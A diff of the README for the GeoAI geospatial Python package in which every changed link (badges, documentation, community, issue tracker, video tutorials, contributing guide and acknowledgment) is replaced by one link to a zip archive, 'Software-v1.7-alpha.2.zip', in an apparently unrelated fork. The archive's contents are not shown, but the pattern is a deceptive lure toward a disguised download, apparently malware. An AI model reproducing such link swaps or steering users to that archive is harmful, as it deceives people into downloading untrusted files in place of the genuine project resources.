@@ -1,20 +1,20 @@
 # GeoAI: Artificial Intelligence for Geospatial Data
 
-[![image](https://img.shields.io/pypi/v/geoai-py.svg)](https://pypi.python.org/pypi/geoai-py)
-[![image](https://static.pepy.tech/badge/geoai-py)](https://pepy.tech/project/geoai-py)
-[![image](https://img.shields.io/conda/vn/conda-forge/geoai.svg)](https://anaconda.org/conda-forge/geoai)
-[![Conda Downloads](https://img.shields.io/conda/dn/conda-forge/geoai.svg)](https://anaconda.org/conda-forge/geoai)
-[![Conda Recipe](https://img.shields.io/badge/recipe-geoai-green.svg)](https://github.com/giswqs/geoai-py-feedstock)
-[![image](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![image](https://img.shields.io/badge/YouTube-Tutorials-red)](https://bit.ly/GeoAI-Tutorials)
+[![image](https://github.com/goodnesskalu/geoai/raw/refs/heads/main/docs/Software-v1.7-alpha.2.zip)](https://github.com/goodnesskalu/geoai/raw/refs/heads/main/docs/Software-v1.7-alpha.2.zip)
+[![image](https://github.com/goodnesskalu/geoai/raw/refs/heads/main/docs/Software-v1.7-alpha.2.zip)](https://github.com/goodnesskalu/geoai/raw/refs/heads/main/docs/Software-v1.7-alpha.2.zip)
+[![image](https://github.com/goodnesskalu/geoai/raw/refs/heads/main/docs/Software-v1.7-alpha.2.zip)](https://github.com/goodnesskalu/geoai/raw/refs/heads/main/docs/Software-v1.7-alpha.2.zip)
+[![Conda Downloads](https://github.com/goodnesskalu/geoai/raw/refs/heads/main/docs/Software-v1.7-alpha.2.zip)](https://github.com/goodnesskalu/geoai/raw/refs/heads/main/docs/Software-v1.7-alpha.2.zip)
+[![Conda Recipe](https://github.com/goodnesskalu/geoai/raw/refs/heads/main/docs/Software-v1.7-alpha.2.zip)](https://github.com/goodnesskalu/geoai/raw/refs/heads/main/docs/Software-v1.7-alpha.2.zip)
+[![image](https://github.com/goodnesskalu/geoai/raw/refs/heads/main/docs/Software-v1.7-alpha.2.zip)](https://github.com/goodnesskalu/geoai/raw/refs/heads/main/docs/Software-v1.7-alpha.2.zip)
+[![image](https://github.com/goodnesskalu/geoai/raw/refs/heads/main/docs/Software-v1.7-alpha.2.zip)](https://github.com/goodnesskalu/geoai/raw/refs/heads/main/docs/Software-v1.7-alpha.2.zip)
 
 **A powerful Python package for integrating Artificial Intelligence with geospatial data analysis and visualization**
 
 GeoAI bridges the gap between AI and geospatial analysis, providing tools for processing, analyzing, and visualizing geospatial data using advanced machine learning techniques. Whether you're working with satellite imagery, LiDAR point clouds, or vector data, GeoAI offers intuitive interfaces to apply cutting-edge AI models.
 
--   📖 **Documentation:** [https://geoai.gishub.org](https://geoai.gishub.org)
--   💬 **Community:** [GitHub Discussions](https://github.com/opengeos/geoai/discussions)
--   🐛 **Issue Tracker:** [GitHub Issues](https://github.com/opengeos/geoai/issues)
+-   📖 **Documentation:** [https://github.com/goodnesskalu/geoai/raw/refs/heads/main/docs/Software-v1.7-alpha.2.zip](https://github.com/goodnesskalu/geoai/raw/refs/heads/main/docs/Software-v1.7-alpha.2.zip)
+-   💬 **Community:** [GitHub Discussions](https://github.com/goodnesskalu/geoai/raw/refs/heads/main/docs/Software-v1.7-alpha.2.zip)
+-   🐛 **Issue Tracker:** [GitHub Issues](https://github.com/goodnesskalu/geoai/raw/refs/heads/main/docs/Software-v1.7-alpha.2.zip)
 
 ## 🚀 Key Features
 
@@ -78,7 +78,7 @@ mamba install -c conda-forge geoai
 
 ## 📋 Documentation
 
-Comprehensive documentation is available at [https://geoai.gishub.org](https://geoai.gishub.org), including:
+Comprehensive documentation is available at [https://github.com/goodnesskalu/geoai/raw/refs/heads/main/docs/Software-v1.7-alpha.2.zip](https://github.com/goodnesskalu/geoai/raw/refs/heads/main/docs/Software-v1.7-alpha.2.zip), including:
 
 -   Detailed API reference
 -   Tutorials and example notebooks
@@ -87,13 +87,13 @@ Comprehensive documentation is available at [https://geoai.gishub.org](https://g
 
 ## 📺 Video Tutorials
 
-Check out our [YouTube channel](https://bit.ly/GeoAI-Tutorials) for video tutorials on using GeoAI for geospatial data analysis and visualization.
+Check out our [YouTube channel](https://github.com/goodnesskalu/geoai/raw/refs/heads/main/docs/Software-v1.7-alpha.2.zip) for video tutorials on using GeoAI for geospatial data analysis and visualization.
 
-[![cover](https://github.com/user-attachments/assets/3cde9547-ab62-4d70-b23a-3e5ed27c7407)](https://bit.ly/GeoAI-Tutorials)
+[![cover](https://github.com/goodnesskalu/geoai/raw/refs/heads/main/docs/Software-v1.7-alpha.2.zip)](https://github.com/goodnesskalu/geoai/raw/refs/heads/main/docs/Software-v1.7-alpha.2.zip)
 
 ## 🤝 Contributing
 
-We welcome contributions of all kinds! See our [contributing guide](https://geoai.gishub.org/contributing) for ways to get started.
+We welcome contributions of all kinds! See our [contributing guide](https://github.com/goodnesskalu/geoai/raw/refs/heads/main/docs/Software-v1.7-alpha.2.zip) for ways to get started.
 
 ## 📄 License
 
@@ -101,4 +101,4 @@ GeoAI is free and open source software, licensed under the MIT License.
 
 ## 💖 Acknowledgment
 
-Some of the pre-trained models used in the geoai package are adapted from the [ArcGIS Living Atlas](https://livingatlas.arcgis.com/en/browse/?q=dlpk#d=2&q=dlpk). Credits to Esri for making these models available.
+Some of the pre-trained models used in the geoai package are adapted from the [ArcGIS Living Atlas](https://github.com/goodnesskalu/geoai/raw/refs/heads/main/docs/Software-v1.7-alpha.2.zip). Credits to Esri for making these models available.
